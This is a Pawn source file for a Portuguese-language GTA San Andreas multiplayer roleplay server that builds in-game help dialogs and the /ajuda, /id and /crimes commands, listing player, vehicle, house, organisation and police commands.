#include <YSI_Coding\y_hooks>

//------------------------- Definitions and constants -------------------------

//------------------------- Data (This section is for module-internal data. Make sure to make the accessor variable 'static') -------------------------

//------------------------- External API (Functions accessible from other modules. Use 'stock' and PascalCase.) -------------------------

//------------------------- Internal API (Functions to be used only inside of this module. Use 'static (stock)' and camelCase) -------------------------
static ShowHelpDialog(playerid)
{
    new helpList[559];
    strcat(helpList, "{1e90ff}Ajuda � {ffffff}FAQ (D�vidas Frequentes)\n{1e90ff}Ajuda � {ffffff}Invent�rio\n{1e90ff}Ajuda � {ffffff}Ve�culos\n{1e90ff}Ajuda � {ffffff}Ve�culo Pr�prio\n{1e90ff}Ajuda � {ffffff}Comandos do Servidor\n{1e90ff}Ajuda � {ffffff}Comandos do SA-MP\n{1e90ff}Ajuda � {ffffff}Casa\n{1e90ff}Ajuda � {ffffff}Empresa\n{1e90ff}Ajuda � {ffffff}L�der\n{1e90ff}Ajuda � {ffffff}Sub-L�der\n{1e90ff}Ajuda � {ffffff}Emprego\n{1e90ff}Ajuda � {ffffff}Organiza��o\n{1e90ff}Ajuda � {ffffff}Acess�rios\n{1e90ff}Ajuda � {ffffff}Caixa Surpresa\n{1e90ff}Ajuda � {ffffff}Anima��es");
    return ShowPlayerDialog(playerid, DIALOG_HELP_LIST, DIALOG_STYLE_LIST, "{FFFFFF}� {1e90ff}Ajuda do Servidor", helpList, "Escolher", "Cancelar");
}

//------------------------- Implementation (This section contains the concrete implementation for this module inside of the callbacks) -------------------------
hook OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
{
    switch (dialogid)
    {
        case DIALOG_HELP_LIST:
		{
		    if (!response)
			{
				return SendClientMessage(playerid, COLOR_INVALID, "Voc� fechou a ajuda.");
			}
			if (response)
			{
			    switch (listitem)
		        {
		            case 0:
					{
	     				return ShowHelpDialog(playerid);
					}
		            case 1:
					{
					    new helpMessage[392];
					    strcat(helpMessage, "{0080ff}Op��es:\n");
						strcat(helpMessage, "{FFFFFF}USAR: {848484}Usa o item selecionado.\n");
						strcat(helpMessage, "{FFFFFF}VENDER: {848484}Vende o item selecionado para outro jogador.\n");
	                    strcat(helpMessage, "{FFFFFF}DESTRUIR: {848484}Destr�i permanentemente o item selecionado.\n");
						strcat(helpMessage, "{FFFFFF}ANUNCIAR: {848484}Anuncia a venda do item selecionado.\n\n");
						strcat(helpMessage, "{ff6347}OBS: {FFFFFF}Para abrir seu invent�rio digite: {0080ff}(/inventario) {FFFFFF}ou pressione {0080ff}(Y).{FFFFFF}\n");
						ShowPlayerDialog(playerid, DIALOG_HELP_ITEM, DIALOG_STYLE_MSGBOX, "{FFFFFF}Ajuda: {0080ff}Invent�rio", helpMessage, "Voltar", "Fechar");
						return 1;
					}
					case 2:
					{
					    new helpMessage[327];
					    strcat(helpMessage, "{0080ff}Comandos:\n");
						strcat(helpMessage, "{FFFFFF}/motor: {848484}Liga/Desliga o motor do ve�culo.\n");
						strcat(helpMessage, "{FFFFFF}/farol: {848484}Liga/Desliga o farol do ve�culo.\n");
	                    strcat(helpMessage, "{FFFFFF}/mala: {848484}Abre/Fecha o porta-malas do ve�culo.\n");
						strcat(helpMessage, "{FFFFFF}/camera: {848484}Ativa/Desativa a c�mera em primeira pessoa.\n");
						strcat(helpMessage, "{FFFFFF}/flash: {848484}Ativa/Desativa o flash do ve�culo.\n");
						ShowPlayerDialog(playerid, DIALOG_HELP_ITEM, DIALOG_STYLE_MSGBOX, "{FFFFFF}Ajuda: {0080ff}Ve�culos", helpMessage, "Voltar", "Fechar");
						return 1;
					}
					case 3:
					{
						return ShowPlayerDialog(playerid, DIALOG_ONLY_READ, DIALOG_STYLE_MSGBOX, "{FFFFFF}Comandos de Ve�culo Pr�prio", "{FFFFFF}Comandos de Ve�culos Pr�prios:\n\n-> {2e9afe}/meusveiculos - Gerencia todos os seus ve�culos pr�prios\n\n{ff6347}Informa��es:\n\n{0b610b}Sair do jogo: {585858}Toda vez que voc� sair do jogo, seu ve�culo sair� junto, e ser� carregado novamente\nonde estacionou, caso tenha comprado e n�o estacionado, ele ficar� na �ltima posi��o onde ficou pela �ltima vez.\nAo voc� spawnar no menu do ve�culo, a mesma coisa vale para quando o ve�culo explodir\nser� necess�rio spawnar ele novamente.\n\n{0b610b}Limite de Ve�culo: {585858}Jogadores Free poder�o ter no m�ximo 1 ve�culo pr�prio, jogadores Vip poder�o\npossuir at� 5 ve�culos pr�prio (dependendo do tipo de Vip). OBS: Caso tenha comprado 5 ve�culos sendo Vip e\nos dias de VIP acabarem, n�o precisar� se preocupar pois ele ficar� para sempre.\n\n{0b610b}Revenda: {585858}Ao revender seu ve�culo na Revendedora, receber� o valor 3x menor do pre�o original.", "Fechar", "");
					}
					case 4:
					{
						new helpMessage[1770];
						strcat(helpMessage, "{ff6347}OBS: {FFFFFF}Nem todos os comandos est�o listados, portanto, caso tenha d�vidas utilize o chat {0080ff}/n{FFFFFF}.\n\n");
					    strcat(helpMessage, "{FFFFFF}� {0080ff}Lista de comandos e suas respectivas fun��es:\n");
						strcat(helpMessage, "{FFFFFF}/ajuda: {848484}Obt�m informa��es sobre os sistemas do servidor.\n");
						strcat(helpMessage, "{FFFFFF}/rg: {848484}Visualiza a sua identidade.\n");
	                    strcat(helpMessage, "{FFFFFF}/configuracoes: {848484}Abre as personaliza��es de modo de jogo.\n");
						strcat(helpMessage, "{FFFFFF}/regras: {848484}Mostra as regras do servidor.\n");
						strcat(helpMessage, "{FFFFFF}/sites: {848484}Mostra as m�dias sociais do servidor.\n");
						strcat(helpMessage, "{FFFFFF}/relatorio(/relato): {848484}Solicita um atendimento com um administrador.\n");
						strcat(helpMessage, "{FFFFFF}/anunciar(/an): {848484}Anuncia algo para todos os jogadores.\n");
						strcat(helpMessage, "{FFFFFF}/eu: {848484}Simula uma a��o no chat.\n");
						strcat(helpMessage, "{FFFFFF}/pagar: {848484}Dar dinheiro de sua m�o para um jogador.\n");
						strcat(helpMessage, "{FFFFFF}/gps: {848484}Localizar um local do servidor.\n");
						strcat(helpMessage, "{FFFFFF}/livrar: {848484}Joga fora itens ilegais.\n");
						strcat(helpMessage, "{FFFFFF}/ejetar: {848484}Expulsa um jogador do ve�culo.\n");
						strcat(helpMessage, "{FFFFFF}/solicitar: {848484}Solicita por um servi�o.\n");
						strcat(helpMessage, "{FFFFFF}/titulos: {848484}Mostra os t�tulos dispon�veis para uso.\n");
						strcat(helpMessage, "{FFFFFF}/mostrarrg: {848484}Mostra sua identidade para um jogador.\n");
						strcat(helpMessage, "{FFFFFF}/procurar: {848484}Procura por um jogador no mapa.\n");
						strcat(helpMessage, "{FFFFFF}/localizar: {848484}Localiza locais importantes do jogador.\n");
						strcat(helpMessage, "{FFFFFF}/minhaslicencas: {848484}Mostra suas habilita��es.\n");
						strcat(helpMessage, "{FFFFFF}/habilidades: {848484}Mostra suas habilidades profissionais.\n");
						strcat(helpMessage, "{FFFFFF}/animes: {848484}Mostra os animes do servidor.\n");
						strcat(helpMessage, "{FFFFFF}/inventario: {848484}Abre o invent�rio do jogador.\n");
						strcat(helpMessage, "{FFFFFF}/dormir: {848484}Ativa o modo dormir.\n");
						strcat(helpMessage, "{FFFFFF}/rank: {848484}V� o rank de jogadores do servidor.\n");
						strcat(helpMessage, "{FFFFFF}/meusveiculos: {848484}Acessa o menu de ve�culos pr�prios do jogador.\n");
						strcat(helpMessage, "{FFFFFF}/acessorios: {848484}Acessa o menu de acess�rios equipados do jogador.\n");
						ShowPlayerDialog(playerid, DIALOG_HELP_CMDS1, DIALOG_STYLE_MSGBOX, "{FFFFFF}Listagem de Comandos: {0080ff}1", helpMessage, "Pr�ximo", "Voltar");
						return 1;
					}
					case 5:
					{
						new helpMessage[1999];
						strcat(helpMessage, "{0080ff}/quit (ou /q): {FFFFFF}Fecha o GTA.\n\n");
						strcat(helpMessage, "{0080ff}/fpslimit: {FFFFFF}Este comando define o limite de FPS (quadros por segundo) para o seu jogo.\nQuanto maior o limite, mais suave � o seu jogo. N�o tem efeito se o limitador de quadro\nestiver desativado nas op��es gr�ficas. O limite pode ser definido entre 20 e 90.\n\n");
						strcat(helpMessage, "{0080ff}/pagesize: {FFFFFF}� usado para escolher a quantidade de linhas do chat a serem exibidas.\nPode ser de 10 a 20 linhas. O tamanho da p�gina � 10 por padr�o.\n\n");
						strcat(helpMessage, "{0080ff}/headmove: {FFFFFF}Este comando ir� ativar/desativar os movimentos da cabe�a dos personagens.\n\n");
						strcat(helpMessage, "{0080ff}/timestamp: {FFFFFF}Este comando mostrar�/ocultar� a hora ao lado de todas as mensagens\ndo chat (A hora exibida � a do seu computador, n�o a do servidor).\n\n");
						strcat(helpMessage, "{0080ff}/dl: {FFFFFF}Este comando ativa/desativa um r�tulo em todos os ve�culos (apenas para voc�)\nexibindo a identifica��o do ID do ve�culo, modelo, lataria e etc.\n\n");
						strcat(helpMessage, "{0080ff}/audiomsg: {FFFFFF}Ativa/Desativa a mensagem que � exibida no chat quando uma URL � transmitida\npara voc�. Exemplo: Quando um jogador colocar som pr�ximo a voc�, n�o vai aparecder o\nLINK da m�sica, apenas ir� reproduzir o �udio da URL.\n\n");
						strcat(helpMessage, "{0080ff}/fontsize: {FFFFFF}Altera o tamanho da fonte da interface do usu�rio (bate-papo, di�logos[menu] e etc).\nO tamanho de letra v�lido � de -3 a 5.\n\n");
						strcat(helpMessage, "{0080ff}/meustatus: {FFFFFF}Comando para exibir um menu com informa��es de sua CONEX�O.\n\n\n");
						strcat(helpMessage, "{848484}Teclas de Atalho:.\n");
						strcat(helpMessage, "{FFFFFF}[TAB] - {848484}Exibe informa��es dos jogadores conectados, como: level, ping e etc.\n");
						strcat(helpMessage, "{FFFFFF}[F5] - {848484}Exibe as estat�sticas de largura de banda (Conex�o).\n");
						strcat(helpMessage, "{FFFFFF}[F7] - {848484}Altera o CHAT do Servidor (Oculta ou diminui o brilho).\n");
						strcat(helpMessage, "{FFFFFF}[F5] - {848484}Tira um a print(Screenshot) da tela. (Pasta: GTA San Andreas User Files).\n");
						strcat(helpMessage, "{FFFFFF}[F9] - {848484}Oculta/Mostra o chatkill.\n");
						strcat(helpMessage, "{FFFFFF}[T] - {848484}Abre o chat do servidor para inserior comandos ou mensagens.\n");
						strcat(helpMessage, "{FFFFFF}[G] - {848484}Entra em um ve�culo como passageiro.\n");
						ShowPlayerDialog(playerid, DIALOG_HELP_ITEM, DIALOG_STYLE_MSGBOX, "{FFFFFF}Comandos do: {0080ff}SA-MP", helpMessage, "Voltar", "Fechar");
						return 1;
					}
					case 6:
					{
						/*if (playerInfo[playerid][pHouseKey] == UNDEFINED_HOUSE)
						{
							return SendClientMessage(playerid, COLOR_INVALID, "Voc� n�o possui uma casa.");
						}*/
						new helpMessage[246];
					    strcat(helpMessage, "{0080ff}Comandos:\n");
						strcat(helpMessage, "{FFFFFF}/chave: {848484}Tranca/Destranca a casa.\n");
						strcat(helpMessage, "{FFFFFF}/abandonarcasa: {848484}Vende a casa para o governo.\n");
	                    strcat(helpMessage, "{FFFFFF}/vendercasa: {848484}Vende a casa para um jogador.\n");
						strcat(helpMessage, "{FFFFFF}/menucasa: {848484}Acessa as op��es da casa.\n");
						ShowPlayerDialog(playerid, DIALOG_HELP_ITEM, DIALOG_STYLE_MSGBOX, "{FFFFFF}Ajuda: {0080ff}Casa", helpMessage, "Voltar", "Fechar");
						return 1;
					}
					case 7:
					{
						/*if (playerInfo[playerid][pCompanyKey] == UNDEFINED_BIZZ)
						{
							return SendClientMessage(playerid, COLOR_INVALID, "Voc� n�o possui uma empresa.");
						}*/
						new helpMessage[268];
					    strcat(helpMessage, "{0080ff}Comandos:\n");
						strcat(helpMessage, "{FFFFFF}/chaveb: {848484}Tranca/Destranca a empresa.\n");
						strcat(helpMessage, "{FFFFFF}/abandonarempresa: {848484}Vende a empresa para o governo.\n");
	                    strcat(helpMessage, "{FFFFFF}/venderempresa: {848484}Vende a empresa para um jogador.\n");
						strcat(helpMessage, "{FFFFFF}/menuempresa: {848484}Acessa as op��es da empresa.\n");
						ShowPlayerDialog(playerid, DIALOG_HELP_ITEM, DIALOG_STYLE_MSGBOX, "{FFFFFF}Ajuda: {0080ff}Empresa", helpMessage, "Voltar", "Fechar");
						return 1;
					}
					case 8:
					{
					    /*if (playerInfo[playerid][pOrgRole] != 6)
						{
						    return SendClientMessage(playerid, COLOR_INVALID, "Voc� n�o � um l�der.");
						}*/
						//
						new helpMessage[664];
					    strcat(helpMessage, "{0080ff}Comandos destinados aos l�deres:\n");
						strcat(helpMessage, "{FFFFFF}/convidar: {848484}Convida um jogador para a organiza��o.\n");
						strcat(helpMessage, "{FFFFFF}/promover: {848484}Promove um jogador a um cargo superior.\n");
	                    strcat(helpMessage, "{FFFFFF}/demitir: {848484}Demiti um jogador da organiza��o.\n");
						strcat(helpMessage, "{FFFFFF}/addblacklist: {848484}Adiciona um jogador � blacklist.\n");
						strcat(helpMessage, "{FFFFFF}/rblacklist: {848484}Remove um jogador da blacklist.\n");
						strcat(helpMessage, "{FFFFFF}/lchat: {848484}Chat dos l�deres e sub-l�deres do servidor.\n");
						/*if (IsACop(playerid))
						{
							strcat(helpMessage, "{FFFFFF}/rmbq: {848484}Remove todos os bloqueios.\n");
							strcat(helpMessage, "{FFFFFF}/rmbr: {848484}Remove todas as barreiras.\n");
							strcat(helpMessage, "{FFFFFF}/rmpr: {848484}Remove todos os tapetes de pregos.\n");
						}
						if (IsAGoverno(playerid))
						{
							strcat(helpMessage, "{FFFFFF}/mudarimposto: {848484}Altera o valor do imposto de renda.\n");
						}*/
						ShowPlayerDialog(playerid, DIALOG_HELP_ITEM, DIALOG_STYLE_MSGBOX, "{FFFFFF}Ajuda: {0080ff}L�deres", helpMessage, "Voltar", "Fechar");
						return 1;
					}
					case 9:
					{
					    /*if (playerInfo[playerid][pOrgRole] != 5)
						{
						    return SendClientMessage(playerid, COLOR_INVALID, "Voc� n�o � um sub-l�der.");
						}*/
						//
					    new helpMessage[664];
					    strcat(helpMessage, "{0080ff}Comandos destinados aos l�deres:\n");
						strcat(helpMessage, "{FFFFFF}/convidar: {848484}Convida um jogador para a organiza��o.\n");
						strcat(helpMessage, "{FFFFFF}/promover: {848484}Promove um jogador a um cargo superior.\n");
	                    strcat(helpMessage, "{FFFFFF}/demitir: {848484}Demiti um jogador da organiza��o.\n");
						strcat(helpMessage, "{FFFFFF}/addblacklist: {848484}Adiciona um jogador � blacklist.\n");
						strcat(helpMessage, "{FFFFFF}/rblacklist: {848484}Remove um jogador da blacklist.\n");
						strcat(helpMessage, "{FFFFFF}/lchat: {848484}Chat dos l�deres e sub-l�deres do servidor.\n");
						/*if (IsACop(playerid))
						{
							strcat(helpMessage, "{FFFFFF}/rmbq: {848484}Remove todos os bloqueios.\n");
							strcat(helpMessage, "{FFFFFF}/rmbr: {848484}Remove todas as barreiras.\n");
							strcat(helpMessage, "{FFFFFF}/rmpr: {848484}Remove todos os tapetes de pregos.\n");
						}*/
						ShowPlayerDialog(playerid, DIALOG_HELP_ITEM, DIALOG_STYLE_MSGBOX, "{FFFFFF}Ajuda: {0080ff}L�deres", helpMessage, "Voltar", "Fechar");
						return 1;
					}
					case 10:
					{
                        return 1;
					    // return ReCommand:ajudaemprego(playerid);
					}
					case 11:
					{
					    /*if (playerInfo[playerid][pOrg] == UNDEFINED_ORG)
						{
						    return SendClientMessage(playerid, COLOR_INVALID, "Voc� n�o faz parte de uma organiza��o.");
						}
						//
					    new helpMessage[3000], titleDialog[87];
						if (IsACop(playerid) && playerInfo[playerid][pOrg] != ID_GOVERNO && playerInfo[playerid][pOrg] != ID_DETRAN)
						{
							strcat(helpMessage, "{0080ff}Comandos destinados aos policiais:\n");
							strcat(helpMessage, "{FFFFFF}/prender: {848484}Prende um criminoso.\n");
							strcat(helpMessage, "{FFFFFF}/algemar: {848484}Algema um suspeito.\n");
							strcat(helpMessage, "{FFFFFF}/desalgemar: {848484}Desalgema um suspeito.\n");
							strcat(helpMessage, "{FFFFFF}/m: {848484}Usa o Megafone Policial.\n");
							strcat(helpMessage, "{FFFFFF}/reforco: {848484}Pede refor�o contra um jogador.\n");
							strcat(helpMessage, "{FFFFFF}/sireneon: {848484}Coloca sirene no ve�culo.\n");
							strcat(helpMessage, "{FFFFFF}/procurados: {848484}Mostra os criminosos online.\n");
							strcat(helpMessage, "{FFFFFF}/presos: {848484}Mostra os presos online.\n");
							strcat(helpMessage, "{FFFFFF}/multar: {848484}Multa um jogador.\n");
							strcat(helpMessage, "{FFFFFF}/r: {848484}Chat da Organiza��o.\n");
							strcat(helpMessage, "{FFFFFF}/d: {848484}Chat do Governo.\n");
							strcat(helpMessage, "{FFFFFF}/infocar: {848484}Verifica as informa��es de um ve�culo.\n");
							strcat(helpMessage, "{FFFFFF}/multarplaca: {848484}Multa a placa de um ve�culo.\n");
							strcat(helpMessage, "{FFFFFF}/su: {848484}Incrimina um jogador.\n");
							strcat(helpMessage, "{FFFFFF}/bq: {848484}Planta um bloqueio.\n");
							strcat(helpMessage, "{FFFFFF}/barreira: {848484}Planta uma barreira.\n");
							strcat(helpMessage, "{FFFFFF}/pregos: {848484}Planta um tapete de pregos.\n");
							strcat(helpMessage, "{FFFFFF}/gov: {848484}Anuncia algo para todos.\n");
							strcat(helpMessage, "{FFFFFF}/jaula: {848484}Libera o jogador da jaula (Finaliza o sequestro).\n");
							strcat(helpMessage, "{FFFFFF}/desamarrar: {848484}Desamarra o jogador (Finaliza o sequestro).\n");
							strcat(helpMessage, "{FFFFFF}/revistar: {848484}Revista um jogador.\n");
							strcat(helpMessage, "{FFFFFF}/vdp: {848484}D� ao criminoso uma voz de pris�o.\n");
							strcat(helpMessage, "{FFFFFF}/vdr: {848484}D� ao jogador uma voz de revista.\n");
						}
						else if (IsAGoverno(playerid))
						{
							strcat(helpMessage, "{0080ff}Comandos destinados ao governo:\n");
							strcat(helpMessage, "{FFFFFF}/prender: {848484}Prende um criminoso.\n");
							strcat(helpMessage, "{FFFFFF}/algemar: {848484}Algema um suspeito.\n");
							strcat(helpMessage, "{FFFFFF}/desalgemar: {848484}Desalgema um suspeito.\n");
							strcat(helpMessage, "{FFFFFF}/m: {848484}Usa o Megafone Policial.\n");
							strcat(helpMessage, "{FFFFFF}/reforco: {848484}Pede refor�o contra um jogador.\n");
							strcat(helpMessage, "{FFFFFF}/sireneon: {848484}Coloca sirene no ve�culo.\n");
							strcat(helpMessage, "{FFFFFF}/procurados: {848484}Mostra os criminosos online.\n");
							strcat(helpMessage, "{FFFFFF}/presos: {848484}Mostra os presos online.\n");
							strcat(helpMessage, "{FFFFFF}/multar: {848484}Multa um jogador.\n");
							strcat(helpMessage, "{FFFFFF}/r: {848484}Chat da Organiza��o.\n");
							strcat(helpMessage, "{FFFFFF}/d: {848484}Chat do Governo.\n");
							strcat(helpMessage, "{FFFFFF}/infocar: {848484}Verifica as informa��es de um ve�culo.\n");
							strcat(helpMessage, "{FFFFFF}/multarplaca: {848484}Multa a placa de um ve�culo.\n");
							strcat(helpMessage, "{FFFFFF}/su: {848484}Incrimina um jogador.\n");
							strcat(helpMessage, "{FFFFFF}/bq: {848484}Planta um bloqueio.\n");
							strcat(helpMessage, "{FFFFFF}/barreira: {848484}Planta uma barreira.\n");
							strcat(helpMessage, "{FFFFFF}/pregos: {848484}Planta um tapete de pregos.\n");
							strcat(helpMessage, "{FFFFFF}/gov: {848484}Anuncia algo para todos.\n");
							strcat(helpMessage, "{FFFFFF}/revistar: {848484}Revista um jogador.\n");
							strcat(helpMessage, "{FFFFFF}/vdp: {848484}D� ao criminoso uma voz de pris�o.\n");
							strcat(helpMessage, "{FFFFFF}/vdr: {848484}D� ao jogador uma voz de revista.\n");
						}
						else if (playerInfo[playerid][pOrg] == ID_DETRAN)
						{
							strcat(helpMessage, "{ff6347}Importante: {FFFFFF}O DETRAN possui os comandos de Policiais, no entanto ele n�o exerce a fun��o\nS� ser� permitido aplicar o (/su) em blitz caso encontre entorpecentes, nteste caso estar� autorizado a algemar\no suspeito e levar at� a penitenci�ria e prend�-lo. Em hip�tese algumao DETRAN poder� ir atr�s de procurados,\nse isso acontecer, estar� sujeito a levar puni��o por um admin ou receber den�ncia no f�rum.\n\n");
							strcat(helpMessage, "{848484}Observa��o:\n{B4B5B7}O DETRAN est� autorizado a apreender ve�culos que estejam espalhados pela cidade ou que constem com multas.\n� uma revista, caso constate que o ve�culo do indiv�dio tenha multa de at� 1 hora de rec�ncia dever� liber�-lo.\nPara apreender determinado ve�culo, basta utilizar o comando (/guinchar) e lev�-lo at� o p�tio que est�\nlocalizado em sua HQ. Ap�s cjegar na HQ do DETRAN, entre no ve�culo guinchado e leve at� o interior do p�tio.\nAp�s isso, fixe o ve�culo utilizando (/fixar); O DETRAn consegue entrar em ve�culos de ORGANIZA��O caso esteja\npr�ximo a HQ. Caso guinche algum ve�culo pr�prio e n�o consegia entrar no ve�culo por estar trancado, use o\ncomando (/abrirveiculo).\n\n");
							strcat(helpMessage, "{0080ff}Ve�culo Pr�prio: {B4B5B7}Ve�culo pr�prio poder� ser guinchado tamb�m, por�m, ele ir� sumir caso o propriet�rio dele\ndesconecte do servidor, por�m, quando logar novamente, o ve�culo ser� sertado automaticamente no P�tio novamente\nat� o propriet�rio solt�-lo!\n\n");
							strcat(helpMessage, "{ccccff}Mec�nico: {FFFFFF}O DETRAN poder� trabalhar de Bico como Mec�nico caso possua Cargo 2+, para isso, basta ir at�\na Oficina do DETRAN e digitar: (/batercartao).\n\n");
							strcat(helpMessage, "{f60000}Comandos:\n");
							strcat(helpMessage, "{848484}/fixar					/crimes\n");
							strcat(helpMessage, "{848484}/guinchar				/dl\n");
							strcat(helpMessage, "{848484}/desfixar				/revistar\n");
							strcat(helpMessage, "{848484}/prender				/abrirveiculo\n");
							strcat(helpMessage, "{848484}/r					/d\n");
							strcat(helpMessage, "{848484}/m					/multar\n");
							strcat(helpMessage, "{848484}/multarplaca  				/gov\n");
							strcat(helpMessage, "{848484}/reforco				/su\n");
							strcat(helpMessage, "{848484}/bq					/rbq\n");
							strcat(helpMessage, "{848484}/br					/rbr\n");
							strcat(helpMessage, "{848484}/pregos					/rpr\n");
							strcat(helpMessage, "{848484}/algemar				/desalgemar\n");
							strcat(helpMessage, "{848484}/procurados				/presos\n");
							strcat(helpMessage, "{848484}/vdp					/vdr\n");
							strcat(helpMessage, "{848484}/infocar					/sireneon\n\n");
							strcat(helpMessage, "{ccccff}Comandos Mec�nicos:\n");
							strcat(helpMessage, "{848484}/reparar				/blindar\n");
							strcat(helpMessage, "{848484}/tunar					/abastecer\n");

						}
						else if (IsAGangster(playerid) || IsAMafia(playerid) || IsATerror(playerid) || IsAMercenary(playerid))
						{
							strcat(helpMessage, "{0080ff}Comandos destinados aos criminosos:\n");
							strcat(helpMessage, "{FFFFFF}/ga: {848484}Chat da Organiza��o.\n");
							strcat(helpMessage, "{FFFFFF}/assaltar: {848484}Assalta um jogador.\n");
							strcat(helpMessage, "{FFFFFF}/sequestrar: {848484}Sequestra um jogador.\n");
							strcat(helpMessage, "{FFFFFF}/vendermaconha: {848484}Vende maconha para um jogador.\n");
							strcat(helpMessage, "{FFFFFF}/vendercocaina: {848484}Vende coca�na para um jogador.\n");
							strcat(helpMessage, "{FFFFFF}/vendercrack: {848484}Vende crack para um jogador.\n");
							strcat(helpMessage, "{FFFFFF}/roubar: {848484}Rouba um cofre.\n");
							strcat(helpMessage, "{FFFFFF}/ang: {848484}Anuncia algo para todos.\n");
							strcat(helpMessage, "{FFFFFF}/jaula: {848484}Coloca o jogador na jaula do cativeiro.\n");
							strcat(helpMessage, "{FFFFFF}/desamarrar: {848484}Liberta o ref�m do sequestro.\n");
							strcat(helpMessage, "{FFFFFF}/incendiar: {848484}Incendeia um local.\n");
							if (IsAMafia(playerid))
							{
								strcat(helpMessage, "{FFFFFF}/venderkit: {848484}Vende de Kit de Armas.\n\n");
								strcat(helpMessage, "{ff6347}OBS: {FFFFFF}� poss�vel vender dinamites e outros itens no territ�rio.\n");
							}
							if (IsATerror(playerid))
							{
								strcat(helpMessage, "{FFFFFF}/trvarma: {848484}Vende Armas Espeiciais.\n");
								strcat(helpMessage, "{FFFFFF}/homembomba: {848484}Explodir-se.\n");
								strcat(helpMessage, "{FFFFFF}/plantarbomba: {848484}Planta uma bomba.\n");
								strcat(helpMessage, "{FFFFFF}/dbomba: {848484}Explode uma bomba plantada.\n");
							}
							if (IsAMercenary(playerid))
							{
								strcat(helpMessage, "{FFFFFF}/mcvarma: {848484}Vende Armas Espeicais.\n");
							}
						}
						else if (playerInfo[playerid][pOrg] == ID_DETRAN)
						{
							strcat(helpMessage, "{0080ff}Comandos destinados ao detran:\n");
							strcat(helpMessage, "{FFFFFF}/ga: {848484}Chat da Organiza��o.\n");
							strcat(helpMessage, "{FFFFFF}/reparar: {848484}Repara o ve�culo de um jogador.\n");
							strcat(helpMessage, "{FFFFFF}/blindar: {848484}Blinda o ve�culo de um jogador.\n");
							strcat(helpMessage, "{FFFFFF}/abastecer: {848484}Abastece o ve�culo de um jogador.\n");
							strcat(helpMessage, "{FFFFFF}/tunar: {848484}Tuna o ve�culo de um jogadorr.\n");
							strcat(helpMessage, "{FFFFFF}/fixar: {848484}Fixa/Refixa um ve�culo na HQ.\n");
							strcat(helpMessage, "{FFFFFF}/desfixar: {848484}Desfixa um ve�culo fixado na HQ.\n");
							strcat(helpMessage, "{FFFFFF}/darrespawn: {848484}Respawna um ve�culo pr�ximo.\n");
							strcat(helpMessage, "{FFFFFF}/guinchar: {848484}Guincha um ve�culo (Exceto motos).\n");
							strcat(helpMessage, "{FFFFFF}/guincharmoto: {848484}Guinhca uma moto (Apenas no BoxVille).\n");
							strcat(helpMessage, "{FFFFFF}/soltarmotos: {848484}Solta a moto guinchada (Apenas no BoxVille).\n");
						}
						else if (playerInfo[playerid][pOrg] == ID_REPORTERES)
						{
							strcat(helpMessage, "{0080ff}Comandos destinados aos rep�rteres:\n");
							strcat(helpMessage, "{FFFFFF}/ga: {848484}Chat da Organiza��o.\n");
							strcat(helpMessage, "{FFFFFF}/noticia(/no): {848484}Divulga uma not�cia.\n");
							strcat(helpMessage, "{FFFFFF}/aovivo: {848484}Inicia uma entrevista.\n");
						}
						format(titleDialog, sizeof(titleDialog), "{FFFFFF}Comandos do(a): {%06x}%s", orgColors[playerInfo[playerid][pOrg]] >>> 8, OrgInfo[playerInfo[playerid][pOrg]][oName]);
						ShowPlayerDialog(playerid, DIALOG_HELP_ITEM, DIALOG_STYLE_MSGBOX, titleDialog, helpMessage, "Entendi", "");
						return 1;*/
					}
					case 12:
					{
						new helpMessage[164];
					    strcat(helpMessage, "{0080ff}Comandos:\n");
						strcat(helpMessage, "{FFFFFF}/acessorios: {848484}Edita os acess�rios equipados.\n\n");
						strcat(helpMessage, "{ff6347}OBS: {FFFFFF}Para equipar um acess�rio, basta us�-lo no seu invent�rio.\n");
						ShowPlayerDialog(playerid, DIALOG_HELP_ITEM, DIALOG_STYLE_MSGBOX, "{FFFFFF}Ajuda: {0080ff}Acess�rios", helpMessage, "Voltar", "Fechar");
						return 1;
					}
					case 13:
					{
                        return 1;
						// return ReCommand:infocaixa(playerid);
					}
					case 14:
					{
                        return 1;
						// return ReCommand:animes(playerid);
					}
				}
			}
		}
    }
    return 1;
}

YCMD:ajuda(playerid, params[], help)
{
	return ShowHelpDialog(playerid);
}

YCMD:id(playerid, params[], help) 
{
	new id;
	if (sscanf(params, "u", id))
	{
		return SendClientMessage(playerid, COLOR_INVALID, "USE: /id [ID/Nick]");
	}
    if (!IsValidPlayer(id, PlayerData_GetIsLogged(id)))
	{
		return SendClientMessage(playerid, COLOR_INVALID, "Esse n�o � um player ativo.");
	}
	if (PlayerData_GetAdmin(id) >= HELPER_OWNER)
	{
        return 0;
	}

	new string[55];
	format(string, sizeof(string), "ID: (%d) %s - Level[%d].", id, Player_GetName(id), PlayerData_GetLevel(id));
    SendClientMessage(playerid, COLOR_GRAD1, string);
    return 1;
}

YCMD:crimes(playerid, params[], help) 
{
    static crimesDialog[2425 + 1];
    strcat(crimesDialog, "{848484}- /su {FFFFFF}TH: {848484}Tentativa de Homic�dio.\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}Invas�o: {848484}Invas�o de local restrito.\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}DOP: {848484}Desobedi�nciaa uma ordem policial.\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}Desacato: {848484}Desrespeito � um oficial da justi�a.\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}Dinamite: {848484}Quando um suspeito estiver portando dinamite.\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}Vandalismo: {848484}Quando um jogador destr�i um bem p�blico.\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}Racha: {848484}Quando um jogador est� competindo numa racha.\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}Fuga: {848484}Quando um procurado entra em fuga com a pol�cia.\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}Amea�a: {848484}Quando um jogador amea�a claramente outro.\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}Sequestro: {848484}Quando h� um sequestro por parte de outro jogador.\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}Atentado: {848484}Quando um jogador est� fazendo parte de um atentado.\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}Materiais: {848484}Quando um jogador � pego em uma revista portando materiais.\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}Cumplice: {848484}Quando um jogador est� servido de suporte � um procurado.\n");
